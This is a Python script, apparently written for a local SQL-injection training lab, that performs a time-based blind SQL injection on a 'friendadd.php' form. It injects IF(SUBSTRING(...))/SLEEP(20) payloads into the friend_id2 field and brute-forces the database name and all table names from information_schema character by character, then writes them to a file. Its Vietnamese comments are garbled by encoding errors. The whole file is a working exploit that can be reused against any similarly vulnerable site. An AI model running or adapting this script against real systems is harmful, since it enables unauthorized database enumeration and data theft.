import requests
import string
import time
import sys

url = "http://localhost/sql-injection-lab/1/friendadd.php"
cookies = {"PHPSESSID": "47jhemumu2hib038cmlrnp3gml"}
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "http://localhost/sql-injection-lab/1/friendadd.php"
}

# K√Ω t·ª± brute-force
char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_" + "{}!@#$%^&*()_+-=[]|;:,.<>?/'\""

# Th·ªùi gian ph·∫£n h·ªìi ƒë·ªÉ x√°c ƒë·ªãnh payload ƒë√∫ng
TIME_THRESHOLD = 20

# H√†m brute-force k√Ω t·ª± SQL
def brute_force_sql(query_template, description):
    extracted_value = ""
    index = 1

    while True:
        found = False
        for char in char_set:
            payload = f"1' AND IF(SUBSTRING(({query_template}),{index},1)='{char}', SLEEP(20), 0) -- "
            data = {"friend_id": "21", "friend_id2": payload, "add_submit": "Addfriend"}

            start_time = time.time()
            response = requests.post(url, data=data, headers=headers, cookies=cookies)
            elapsed_time = time.time() - start_time

            if elapsed_time > TIME_THRESHOLD:
                extracted_value += char
                sys.stdout.write(f"\r[+] Extracting {description}: {extracted_value}")
                sys.stdout.flush()
                found = True
                break

        if not found:
            break

        index += 1

    print()  # Xu·ªëng d√≤ng khi ho√†n th√†nh
    return extracted_value

# 1Ô∏è‚É£ Extract Database Name
database_name = brute_force_sql("SELECT database()", "Database Name")

# 2Ô∏è‚É£ Extract All Table Names
table_names = []
table_index = 0

while True:
    table_name = brute_force_sql(
        f"SELECT table_name FROM information_schema.tables WHERE table_schema='{database_name}' LIMIT 1 OFFSET {table_index}",
        f"Table Name {table_index + 1}"
    )

    if table_name == "":
        break

    table_names.append(table_name)
    table_index += 1

with open("tables.txt", "w") as f:
    for table in table_names:
        f.write(table + "\n")

print("\nüìã List of Tables:")
for i, table in enumerate(table_names, 1):
    print(f"  {i}. {table}")

print("\n‚úÖ Danh s√°ch b·∫£ng ƒë√£ ƒë∆∞·ª£c l∆∞u v√†o file 'tables.txt'")
